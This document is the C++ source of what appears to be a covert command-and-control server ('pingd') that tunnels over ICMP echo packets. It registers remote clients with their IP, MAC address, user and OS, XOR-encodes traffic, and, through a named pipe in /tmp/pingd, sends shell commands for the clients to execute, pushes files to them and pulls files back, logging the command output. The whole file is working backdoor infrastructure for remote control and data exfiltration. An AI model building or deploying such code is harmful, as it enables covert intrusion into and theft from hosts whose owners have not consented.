#include <cstdint>
#include <cstdio>
#include <cstring>
#include <iostream>
#include <sstream>
#include <fstream>
#include <map>
#include <vector>
#include <thread>
#include <mutex>
#include <algorithm>
#include <iterator>

#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <fcntl.h>
#include <signal.h>

struct buffer
{
    size_t pos{ 0 };
    bool ready{ false };
    std::vector<uint8_t> data;
};

struct connection
{
    connection()
        : flush{ 0x00 } {
    }
    std::string ip_address;
    std::string phys_address;
    std::string user;
    std::string os;

    buffer out_buf;
    buffer in_buf;
    uint8_t flush;
};

using connections_t = std::map<uint32_t, connection>;

static uint32_t next_connection_id = 0xDEAD;

static connections_t active_connections;
static std::mutex active_connections_mutex;

static int pipefd, sockfd;

static bool running = false;

static uint16_t checksum(uint16_t *ptr, int nbytes) {
    uint64_t sum;
    uint16_t oddbyte, rs;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }

    if (nbytes == 1) {
        oddbyte = 0;
        *((uint8_t *)&oddbyte) = *(uint8_t *)ptr;
        sum += oddbyte;
    }

    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    rs = ~sum;
    return rs;
}

std::vector<std::string> split_input(const std::string &input, const std::string &delimiter) {
    size_t pos_start = 0, pos_end, delim_len = delimiter.length();
    std::string token;
    std::vector<std::string> res;

    while ((pos_end = input.find(delimiter, pos_start)) != std::string::npos) {
        token = input.substr(pos_start, pos_end - pos_start);
        pos_start = pos_end + delim_len;
        res.push_back(token);
    }

    res.push_back(input.substr(pos_start));
    return res;
}

void termination_handler(int) {
    std::puts("Killing process!");
    running = false;
    close(sockfd);
    close(pipefd);
    std::exit(0);
}

void init_handler(uint32_t id) {
    if (active_connections.find(id) == active_connections.end()) {
        return;
    }
    auto &connection = active_connections.at(id);

    std::cout << "New connection with id=" << id << "\n";

    while (!connection.in_buf.ready) {}

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        std::string host_info;

        if (connection.in_buf.data.size() > 0) {
            host_info = std::string(connection.in_buf.data.begin(), connection.in_buf.data.end());
            std::cout << "\t" << host_info << "\n";

            auto res = split_input(host_info, "/");

            connection.ip_address = res.at(0);
            connection.phys_address = res.at(1);
            connection.user = res.at(2);
            connection.os = res.at(3);
        }

        connection.in_buf.ready = false;
        connection.in_buf.data.clear();
    }
}

void encode_data(uint32_t key, uint8_t *data, uint32_t size) {
    int index = 3;
    for (uint32_t i = 0; i < size; i++) {
        if (index < 0) index = 3;
        uint8_t val = data[i];
        uint8_t e = (key >> (8 * index)) & 0xFF;
        data[i] = val ^ e;
        index--;
    }
}

void listen_task() {
    uint8_t in[1024];
    sockaddr_in addr;

    if ((sockfd = socket(PF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) {
        perror("socket");
        std::exit(-1);
    }

    while (running) {
        std::memset(in, 0, sizeof(in));

        size_t nbytes = read(sockfd, in, sizeof(in));
        if (nbytes < sizeof(iphdr)) continue;
        nbytes -= sizeof(iphdr);

        if (nbytes < sizeof(icmphdr)) continue;
        nbytes -= sizeof(icmphdr);

        iphdr *ip = (iphdr *)in;
        icmphdr *icmp = (icmphdr *)(in + sizeof(iphdr));

        size_t packet_size = sizeof(icmphdr);
        uint32_t id;
        size_t index = sizeof(iphdr) + sizeof(icmphdr);

        if (in[index] == 0) {
            std::lock_guard<std::mutex> guard(active_connections_mutex);
            id = next_connection_id++;
            active_connections.insert({ id, connection{} });
            std::memcpy(&in[index], &id, sizeof(id));
            packet_size += sizeof(id);
            packet_size += 2;
            std::thread init_handler_thread(init_handler, id);
            init_handler_thread.detach();
        } else {

            if (nbytes < sizeof(id)) continue;
            nbytes -= sizeof(id);

            std::memcpy(&id, &in[index], sizeof(id));

            if (active_connections.find(id) == active_connections.end()) continue;

            auto &connection = active_connections.at(id);
            auto &in_buf = connection.in_buf;
            auto &out_buf = connection.out_buf;

            uint8_t in_size = in[index + 5];
            uint8_t out_size = 0;

            if (in_size > 0) {
                std::lock_guard<std::mutex> guard(active_connections_mutex);
                index += sizeof(id);

                if (in[index] == 0x00 && in_size > 0) {
                    encode_data(id, &in[index + 2], in_size);
                    in_buf.data.insert(in_buf.data.end(), &in[index + 2], &in[index + 2 + in_size]);
                } else if (in[index] == 0x01) {
                    if (in_size > 0) {
                        encode_data(id, &in[index + 2], in_size);
                        in_buf.data.insert(in_buf.data.end(), &in[index + 2], &in[index + 2 + in_size]);
                    }
                    in_buf.ready = true;
                }
            }

            std::memcpy(&in[sizeof(iphdr) + packet_size], &id, sizeof(id));
            packet_size += sizeof(id);

            std::memcpy(&in[sizeof(iphdr) + packet_size], &connection.flush, sizeof(connection.flush));
            packet_size += sizeof(connection.flush);
            packet_size += sizeof(out_size);

            std::memset(&in[sizeof(iphdr) + packet_size + 1], 0, 64);

            if (connection.flush == 0x01) {
                connection.flush = 0x00;
            }

            if (out_buf.ready && out_buf.pos < out_buf.data.size()) {
                std::lock_guard<std::mutex> guard(active_connections_mutex);
                out_size = (out_buf.data.size() - out_buf.pos) > 64 ? 64 : (out_buf.data.size() - out_buf.pos);
                std::memcpy(&in[sizeof(iphdr) + packet_size], out_buf.data.data() + out_buf.pos, out_size);
                encode_data(id, &in[sizeof(iphdr) + packet_size], out_size);
                out_buf.pos += out_size;
                if (out_buf.pos >= out_buf.data.size()) {
                    std::cout << "Flushing data for id=" << id << "\n";
                    out_buf.data.clear();
                    out_buf.pos = 0;
                    out_buf.ready = false;
                    connection.flush = 0x01;
                }
            }

            std::memcpy(&in[sizeof(iphdr) + sizeof(icmphdr) + sizeof(id) + 1], &out_size, sizeof(out_size));
        }

        packet_size += 64;

        icmp->type = 0;
        addr.sin_family = AF_INET;
        addr.sin_port = htons(0);
        addr.sin_addr.s_addr = ip->saddr;

        icmp->checksum = 0x00;
        icmp->checksum = checksum((uint16_t *)icmp, packet_size);

        if (sendto(sockfd, icmp, packet_size, 0, (sockaddr *)&addr, sizeof(addr)) == -1) {
            perror("sendto");
            std::exit(-1);
        }
    }

    close(sockfd);
}

void recv_file(const std::string &idstr, const std::string &command) {
    std::string cmd = "upload ";

    auto res = split_input(command, " ");

    auto &server_file = res.at(0);
    cmd.append(res.at(1));

    std::stringstream ss(idstr);

    uint32_t id;
    ss >> id;

    if (active_connections.find(id) == active_connections.end()) {
        return;
    }
    auto &connection = active_connections.at(id);

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        connection.out_buf.data.assign(cmd.begin(), cmd.end());
        connection.out_buf.ready = true;
    }

    while (!connection.in_buf.ready) {}

    std::cout << "Received file " << res.at(1) << " from id=" << id << "\n";

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);

        if (connection.in_buf.data.size() > 0) {
            std::ofstream outfile(server_file, std::ios::out | std::ios::binary | std::ios::app);
            outfile.write((char *)connection.in_buf.data.data(), connection.in_buf.data.size());
            outfile.close();
        }

        connection.in_buf.ready = false;
        connection.in_buf.data.clear();
    }
}

void send_file(const std::string &idstr, const std::string &command) {
    std::string cmd = "download ";

    auto res = split_input(command, " ");

    auto &server_file = res.at(0);
    cmd.append(res.at(1));

    std::stringstream ss(idstr);

    uint32_t id;
    ss >> id;

    if (active_connections.find(id) == active_connections.end()) {
        return;
    }
    auto &connection = active_connections.at(id);

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        connection.out_buf.data.insert(connection.out_buf.data.end(), cmd.data(), cmd.data() + cmd.size());

        connection.out_buf.data.emplace_back(' ');

        std::ifstream file(server_file, std::ios::binary);
        file.unsetf(std::ios::skipws);
        if (file.is_open()) {
            connection.out_buf.data.insert(connection.out_buf.data.end(),
                std::istream_iterator<uint8_t>(file),
                std::istream_iterator<uint8_t>());
        } else {
            std::cerr << "Could not open file!\n";
        }

        connection.out_buf.ready = true;
    }

    std::cout << "Sending file:" << server_file << " to id=" << id << "\n";
}

void send_command(const std::string &idstr, const std::string &command) {
    std::string cmd = "run ";
    cmd.append(command);

    std::stringstream ss(idstr);

    uint32_t id;
    ss >> id;

    if (active_connections.find(id) == active_connections.end()) {
        return;
    }
    auto &connection = active_connections.at(id);

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);
        connection.out_buf.data.assign(cmd.begin(), cmd.end());
        connection.out_buf.ready = true;
    }

    std::cout << "Sending command:" << command << " to id=" << id << "\n";

    while (!connection.in_buf.ready) {}

    std::cout << "Command executed for id=" << id << "\n";

    {
        std::lock_guard<std::mutex> guard(active_connections_mutex);

        std::string filename = "/tmp/pingd/";
        filename.append(idstr);

        if (mkdir(filename.c_str(), 0777) == -1) {
            if (errno != EEXIST) {
                perror("mkdir");
                exit(-1);
            }
        }

        filename.append("/commands");

        if (connection.in_buf.data.size() > 0) {
            std::ofstream outfile(filename, std::ios::out | std::ios::binary | std::ios::app);
            outfile << command << "\n";
            outfile << "----------------------------------------\n";
            outfile.write((char *)connection.in_buf.data.data(), connection.in_buf.data.size());
            outfile << "----------------------------------------\n";
            outfile.close();
        }

        connection.in_buf.ready = false;
        connection.in_buf.data.clear();
    }
}

void refresh() {
    std::puts("Refreshing connections!");
    std::lock_guard<std::mutex> guard(active_connections_mutex);

    std::ofstream connections("/tmp/pingd/connections");
    if (!connections.is_open()) {
        std::fputs("Couldn't open file!", stderr);
    }

    for (auto it = active_connections.begin();
         it != active_connections.end();
         it++) {

        std::string out{};
        out += it->second.ip_address;
        out += "/";
        out += it->second.phys_address;
        out += "/";
        out += it->second.user;
        out += "/";
        out += it->second.os;
        out += "/";
        out += std::to_string(it->first);

        connections << out << "\n";
    }

    connections.close();
}

int main(void) {
    // make pipe
    umask(0);
    if (mkdir("/tmp/pingd/", 0777) == -1) {
        if (errno != EEXIST) {
            perror("mkdir");
            exit(-1);
        }
    }

    if (mkfifo("/tmp/pingd/pipe", S_IFIFO | 0666) == -1) {
        if (errno != EEXIST) {
            perror("mkfifo");
            exit(-1);
        }
    }

    // set signals
    struct sigaction new_action, old_action;
    new_action.sa_handler = termination_handler;
    sigemptyset(&new_action.sa_mask);
    new_action.sa_flags = 0;

    sigaction(SIGINT, NULL, &old_action);
    if (old_action.sa_handler != SIG_IGN)
        sigaction(SIGINT, &new_action, NULL);
    sigaction(SIGHUP, NULL, &old_action);
    if (old_action.sa_handler != SIG_IGN)
        sigaction(SIGHUP, &new_action, NULL);
    sigaction(SIGTERM, NULL, &old_action);
    if (old_action.sa_handler != SIG_IGN)
        sigaction(SIGTERM, &new_action, NULL);

    // start thread
    running = true;
    std::thread listen_thread{ listen_task };

    if ((pipefd = open("/tmp/pingd/pipe", O_RDONLY)) == -1) {
        perror("open()");
        return -1;
    }

    while (running) {
        uint8_t buf[1024];
        ssize_t nbytes;
        if ((nbytes = read(pipefd, buf, 1024)) == -1) {
            perror("read()");
        }

        if (nbytes == 0) {
            continue;
        }

        std::string in_str{ (char *)buf, static_cast<size_t>(nbytes) };
        in_str.erase(std::remove(in_str.begin(), in_str.end(), '\n'), in_str.end());

        if (in_str == "refresh") {
            refresh();
            continue;
        }

        auto cmd_pos = in_str.find(' ');
        auto id_bg_pos = in_str.find('(');
        auto id_ed_pos = in_str.find(')');

        std::string cmd = in_str.substr(0, cmd_pos);
        std::string id = in_str.substr(id_bg_pos + 1, id_ed_pos - id_bg_pos - 1);
        std::string arg = in_str.substr(id_ed_pos + 2);

        if (cmd == "send_command") {
            send_command(id, arg);
        } else if (cmd == "send_file") {
            send_file(id, arg);
        } else if (cmd == "recv_file") {
            recv_file(id, arg);
        }
    }

    close(pipefd);

    return 0;
}